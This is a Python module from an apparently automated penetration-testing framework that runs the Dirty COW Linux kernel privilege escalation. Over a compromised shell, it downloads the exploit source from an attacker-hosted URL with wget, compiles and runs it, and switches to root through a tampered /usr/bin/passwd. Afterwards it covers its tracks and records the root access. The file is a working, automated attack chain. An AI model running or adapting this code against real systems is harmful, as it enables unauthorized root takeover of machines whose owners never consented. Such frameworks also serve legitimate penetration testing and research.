from pinaht.file_manager import FileManager
from pinaht.modules.module import Module
from pinaht.knowledge.manager import BufferedModuleManager
from pinaht.knowledge.precondition_factory.preconditions import check_type, check_value
from pinaht.knowledge.precondition_factory.metapreconditions import is_parent, merge
from pinaht.knowledge.precondition import Precondition, MetaPrecondition
from pinaht.knowledge.types.knowledge import Knowledge
from pinaht.knowledge.types.operatingsystemtype import OperatingSystemType
from pinaht.knowledge.types.os import OS
from pinaht.knowledge.types.privilege import Privilege
from pinaht.knowledge.types.shell import Shell, ShellTimeoutError
from pinaht.knowledge.types.target import Target
from pinaht.knowledge.types.ipaddress import IPAddress
from pinaht.knowledge.types.user import User
from typing import Tuple, Dict


class DirtyCowModule(Module):
    """
    Executes the 'Dirty Cow' local privilege escalation servers with kernel version 2.6.22<3.9.

    Exploit-DB: Linux https://www.exploit-db.com/exploits/40839
    """

    def __init__(self, manager, file_manager: FileManager, **kwargs):
        super().__init__(manager, **kwargs)

        self._file_manager = file_manager

        self.estimated_time = 120
        self.success_chance = 0.9

    def _generate_precondition_dnf(self) -> Dict[str, Tuple[Dict[str, Precondition], MetaPrecondition]]:
        """
        Generates the preconditions
        """
        target_precondition = check_type(Target)
        ip_address_precondition = check_type(IPAddress)
        os_precondition = check_type(OS)
        os_type_precondition = check_value(OperatingSystemType.LINUX)
        shell_precondition = check_type(Shell)

        return {
            "meta": (
                {
                    "target": target_precondition,
                    "ip_address": ip_address_precondition,
                    "os": os_precondition,
                    "os_type": os_type_precondition,
                    "shell": shell_precondition,
                },
                merge([is_parent("target", ["ip_address", "os", "shell"]), is_parent("os", ["os_type"])]),
            )
        }

    def execute(
        self, buffered_module_manager: BufferedModuleManager, meta_key: str, keyed_knowledge: Dict[str, Knowledge]
    ):
        """
        Executes the exploit
        """
        ip_address = keyed_knowledge["ip_address"]
        shell = keyed_knowledge["shell"]
        exploit_source_url = self._file_manager.get_file_url_reachable_from_ip(
            type(self).__name__, "dirty-cow.c", ip_address
        )
        print(exploit_source_url)
        try:
            self._logger.info("transferring exploit source file...")
            buffered_module_manager.report(
                f"Transfering exploit source to target \
                                                with command wget -O /tmp/dirty-cow.c {exploit_source_url}"
            )
            if "failed" not in "\n".join(shell.execute(f"wget -O /tmp/dirty-cow.c {exploit_source_url}")):
                self._logger.info("compiling exploit binary...")
                shell.execute("gcc -pthread -o /tmp/dirty-cow /tmp/dirty-cow.c")
                if shell.execute("echo $?")[0] == "0":
                    self._logger.info("running exploit...")
                    shell.execute("/tmp/dirty-cow", timeout=120)

                    self._logger.info("switching to root user")
                    shell.execute("/usr/bin/passwd", new_shell=True)
                else:
                    self._logger.error("exploit binary compilation failed")
            else:
                self._logger.error("exploit source file transfer failed")
        except (ShellTimeoutError):
            buffered_module_manager.report("The file transfer was not successful")
            self._logger.error("exploit command timeout expired")

        self._logger.info("cleaning up")
        shell.execute("rm /tmp/dirty-cow.c")
        shell.execute("rm /tmp/dirty-cow")
        shell.execute("mv /tmp/bak /usr/bin/passwd")
        shell.execute("chown root:root /usr/bin/passwd")

        if shell.execute("whoami")[0] == "root":
            self._logger.info("exploit succeeded")
            buffered_module_manager.add_knowledge(shell, "privilege", Privilege.ROOT, 1.0)
            buffered_module_manager.add_knowledge(shell, "shelluser", User("root"), 1.0)
        else:
            self._logger.error("exploit failed")
